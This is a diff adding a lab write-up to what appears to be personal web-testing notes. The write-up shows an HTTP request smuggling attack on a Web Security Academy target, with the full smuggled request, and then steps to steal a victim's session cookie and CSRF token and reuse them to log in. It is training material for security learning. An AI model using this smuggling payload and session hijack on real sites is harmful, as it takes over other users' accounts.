@@ -288,6 +288,37 @@ Connection: close
 x=1
 ```
 
+**Exploiting HTTP request smuggling to capture other users' requests**
 
+Intercept a comment submit and modify to the following
+Increase second Content-Length to meet your need to show session cookie
+```
+POST / HTTP/1.1
+Host: 0acf00500437c75381604dde003600ed.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 275
+Transfer-Encoding: chunked
 
+0
+
+POST /post/comment HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 930
+Cookie: session=ckjHb97MUxlfsPWlVtKf7m5RBEKuEort
+
+csrf=vztP4gl8AAblrNS6an7vHFX3eZP4lori&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test
+```
+
+Send on burpe
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/428cb6ec-50ac-4c15-a606-1670ccee94ad)
+
+Go back and you should see your session cookie in the comments
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/19334f1f-41d8-435f-a3fd-6fd0cfdc69f7)
+
+Copy the session cookie and csrf token and intercept a login request
+Modify to your copied session cookie and csrf token
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/7a8fa68d-d930-4fdd-b8e8-3617180e795e)
+
+Forward request
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/a0542cf1-3152-4445-b225-b23588691592)
 
